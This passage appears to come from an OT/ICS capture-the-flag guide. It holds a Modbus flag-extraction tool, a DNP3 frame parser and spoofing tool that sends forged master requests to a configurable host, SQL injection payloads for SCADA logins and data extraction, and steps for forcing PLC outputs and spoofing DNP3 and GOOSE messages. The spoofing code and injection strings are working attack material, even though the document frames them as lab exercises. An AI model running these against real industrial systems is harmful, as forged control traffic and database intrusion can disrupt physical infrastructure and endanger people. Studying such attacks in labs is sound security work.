        data=struct.pack(">HH", start_address, count),
    )
    return frame.to_bytes()


def generate_flag_registers() -> dict[int, int]:
    """Encode CTF flag into registers."""
    flag = b"CTF{m0dbus_r3g1st3r_dump}"
    registers: dict[int, int] = {}
    base_addr = 0x0063
    for i, byte in enumerate(flag):
        registers[base_addr + i] = (0x4100 | byte)
    return registers


def extract_flag_from_registers(registers: dict[int, int]) -> str:
    """Extract flag from register low bytes."""
    base = 0x0063
    chars: list[str] = []
    for addr in sorted(registers):
        if addr >= base:
            lsb = registers[addr] & 0xFF
            if lsb == 0:
                break
            chars.append(chr(lsb))
    return "".join(chars)


def main() -> None:
    parser = argparse.ArgumentParser(description="Modbus CTF Analysis Tool")
    sub = parser.add_subparsers(dest="cmd", required=True)

    sub.add_parser("solve", help="Demonstrate automatic flag extraction")
    sub.add_parser("list", help="List CTF challenges")

    submit_p = sub.add_parser("submit", help="Submit flag")
    submit_p.add_argument("challenge_id", choices=list(CHALLENGES.keys()))
    submit_p.add_argument("flag")

    args = parser.parse_args()

    if args.cmd == "solve":
        print("[*] Modbus automatic flag extraction demo\n")
        regs = generate_flag_registers()
        flag = extract_flag_from_registers(regs)
        print(f"[+] Flag: {flag}")

    elif args.cmd == "list":
        print("OT/ICS CTF Challenge List:\n")
        for cid, ch in CHALLENGES.items():
            print(f"  [{ch.points}pt] {ch.name}  (ID: {cid})")
            print(f"         Category: {ch.category}")
            print()

    elif args.cmd == "submit":
        ch = CHALLENGES[args.challenge_id]
        if verify_flag(args.flag, ch):
            print(f"[+] Correct! {ch.points} points earned")
        else:
            print("[-] Wrong answer. Hints:")
            for i, hint in enumerate(ch.hints, 1):
                print(f"    {i}. {hint}")


if __name__ == "__main__":
    main()
```

## Challenge 3: DNP3 Protocol Parser and Spoofing

```python
#!/usr/bin/env python3
"""DNP3 protocol frame parser and spoofing tool."""

import argparse
import socket
import struct
from dataclasses import dataclass


DNP3_START_BYTES = b"\x05\x64"
DNP3_FC_READ     = 0x01
DNP3_FC_RESPONSE = 0x81
GROUP_OCTET_STRING = 110

FLAG_DNP3 = b"CTF{dnp3_pr0t0c0l_sp00f3d}"


@dataclass
class DNP3DataLink:
    length: int
    control: int
    destination: int
    source: int
    crc: int = 0

    @classmethod
    def parse(cls, data: bytes) -> "DNP3DataLink":
        if data[:2] != DNP3_START_BYTES:
            raise ValueError(f"No DNP3 magic: {data[:2].hex()}")
        length, ctrl, dst, src = struct.unpack("<BBHH", data[2:8])
        crc = struct.unpack("<H", data[8:10])[0] if len(data) >= 10 else 0
        return cls(length=length, control=ctrl, destination=dst, source=src, crc=crc)

    def to_bytes(self, payload: bytes = b"") -> bytes:
        total_len = 5 + len(payload)
        header = DNP3_START_BYTES + struct.pack("<BBHH",
            total_len, self.control, self.destination, self.source)
        crc = _crc16(header[2:])
        return header + struct.pack("<H", crc) + payload


def _crc16(data: bytes) -> int:
    crc = 0
    for byte in data:
        crc ^= byte
        for _ in range(8):
            crc = (crc >> 1) ^ 0xA6BC if crc & 1 else crc >> 1
    return crc ^ 0xFFFF


def build_dnp3_read_request(
    master_addr: int,
    rtu_addr: int,
    group: int,
    variation: int,
) -> bytes:
    """Build a DNP3 READ request frame."""
    app_layer = bytes([0xC0, DNP3_FC_READ]) + struct.pack("BBB", group, variation, 0x06)
    transport = bytes([0xC0]) + app_layer
    dl = DNP3DataLink(
        length=5 + len(transport),
        control=0x44,
        destination=rtu_addr,
        source=master_addr,
    )
    return dl.to_bytes(transport)


def demo_dnp3_spoof() -> None:
    """Demonstrate DNP3 spoofing attack locally."""
    print("[*] DNP3 spoofing attack demo\n")
    req = build_dnp3_read_request(1, 10, GROUP_OCTET_STRING, 0)
    print(f"1) READ request frame:")
    print(f"   Size: {len(req)} bytes")
    print(f"   HEX: {req.hex()}")

    dl = DNP3DataLink.parse(req)
    print(f"\n2) Parsed:")
    print(f"   Source: {dl.source} (master)")
    print(f"   Destination: {dl.destination} (RTU)")

    # Simulate RTU response
    iin = struct.pack("<H", 0x0000)
    obj_hdr = struct.pack("BBB", GROUP_OCTET_STRING, 0x00, 0x06)
    app_layer = bytes([0xC0, DNP3_FC_RESPONSE]) + iin + obj_hdr + FLAG_DNP3
    resp_raw = bytes([0xC0]) + app_layer
    dl_resp = DNP3DataLink(length=5+len(resp_raw), control=0x44, destination=1, source=10)
    resp = dl_resp.to_bytes(resp_raw)

    flag_start = resp.index(b"CTF{")
    flag_end = resp.index(b"}", flag_start) + 1
    print(f"\n3) Flag extracted from simulated response:")
    print(f"   {resp[flag_start:flag_end].decode()}")


def main() -> None:
    parser = argparse.ArgumentParser(description="OT/ICS DNP3 CTF Tool")
    sub = parser.add_subparsers(dest="cmd", required=True)
    sub.add_parser("demo", help="DNP3 spoofing demo")

    spoof_p = sub.add_parser("spoof", help="Send spoofed request to RTU")
    spoof_p.add_argument("--host", default="127.0.0.1")
    spoof_p.add_argument("--port", type=int, default=20000)
    spoof_p.add_argument("--master", type=int, default=1)
    spoof_p.add_argument("--rtu", type=int, default=10)

    args = parser.parse_args()

    if args.cmd == "demo":
        demo_dnp3_spoof()
    elif args.cmd == "spoof":
        req = build_dnp3_read_request(args.master, args.rtu, GROUP_OCTET_STRING, 0)
        print(f"[*] Sending DNP3 spoof request to {args.host}:{args.port}")
        try:
            with socket.create_connection((args.host, args.port), timeout=5) as sock:
                sock.sendall(req)
                resp = sock.recv(512)
                if b"CTF{" in resp:
                    idx = resp.index(b"CTF{")
                    end = resp.index(b"}", idx) + 1
                    print(f"[+] Flag: {resp[idx:end].decode()}")
                else:
                    print(f"[*] Response: {resp.hex()}")
        except (ConnectionRefusedError, TimeoutError) as e:
            print(f"[!] Connection failed: {e}")


if __name__ == "__main__":
    main()
```

## CTF Solving Guide

```
Modbus Attack Flow
├── Send FC=03 request (ReadHoldingRegisters)
├── Scan the full register address space (0~65535)
├── Detect anomalous values → filter values in ASCII range (32~126)
└── Extract LSB and concatenate → reconstruct flag

SCADA SQLi Payloads
├── Auth bypass: ' OR '1'='1'--
├── Table enumeration: ' UNION SELECT name,1,1 FROM sqlite_master--
├── Data extraction: ' UNION SELECT flag,1,1 FROM sensor_data--
└── Blind: ' AND substr(flag,1,1)='C'--

PLC Ladder Logic Analysis
├── L5X file: XML → parse XIC/XIO/OTE contact tags
├── Activation condition: satisfy all XIC contacts via AND combination
├── Force output: set coil directly in debug mode
└── Timer/Counter: check TON, CTU accumulation conditions

DNP3 Spoofing Steps
├── Step 1: Capture normal traffic → identify master/RTU addresses
├── Step 2: Forge data link header (source address = master)
├── Step 3: Scan for hidden Group/Variation combinations
└── Step 4: Inject READ request → extract flag from response
```

## Advanced Challenges

1. **Modbus Write Attack**: Use FC=06/0x10 to arbitrarily manipulate PLC output registers
2. **SCADA Visualization**: Clone HMI dashboard with D3.js, display fake sensor values
3. **IEC 61850 Analysis**: Spoof GOOSE messages in substation automation protocol
4. **OPC-UA Vulnerability**: Read/write variables on servers with anonymous access enabled
